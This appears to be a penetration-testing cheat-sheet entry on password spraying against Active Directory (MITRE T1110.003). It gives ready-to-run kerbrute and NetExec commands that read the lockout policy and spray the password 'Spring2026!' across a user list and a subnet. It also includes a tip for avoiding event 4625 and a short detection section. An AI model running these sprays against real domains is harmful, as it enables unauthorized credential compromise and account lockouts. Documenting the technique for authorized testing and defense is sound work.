---
id: pwspray
type: technique
label: "Password spraying"
phase: "initial"
tools: ["kerbrute", "netexec"]
cve: null
detect: "4625 bursts across many accounts from one source."
mitre: "T1110.003"
tag: null
---


# Password spraying

### Affected object / attribute
**User credentials** — one password across many users.

### Concept (deep)
Try **one password across many users** (avoids lockout per user, but watch the domain lockout policy). Prefer `kerbrute` (no 4625) or modules that respect lockout thresholds.

### Commands
```bash
# ── Read lockout policy ─────────────────────────────────────────────
nxc smb 10.10.10.5 -u lowpriv -p '' --pass-pol

# ── Kerbrute password spray ─────────────────────────────────────────
kerbrute passwordspray -d corp.local users.txt 'Spring2026!' --dc 10.10.10.5

# ── NetExec spray ────────────────────────────────────────────────────
nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success
```

### Detection
**4625/4771 bursts** per account; **4768 pre-auth failures**; smart lockout + conditional access.

---
